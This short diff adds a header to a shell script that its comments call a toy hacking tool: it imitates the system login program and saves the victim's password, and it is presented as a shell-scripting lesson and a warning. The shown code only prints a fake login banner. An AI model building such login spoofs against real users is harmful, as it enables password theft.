@@ -1,3 +1,11 @@
+#!/bin/sh
+
+# A toy hacking tool: pretends to be the normal login program, saves your password.
+# No serious hackers would use this today, but it's an example to show how powerful
+# shell scripting is as a general programming language.
+#
+# And when you read it, you will be more critical of things that ask for your password.
+
 clear
 echo
 echo "`uname -s`/`uname -m` (`uname -n`) (`tty`)"
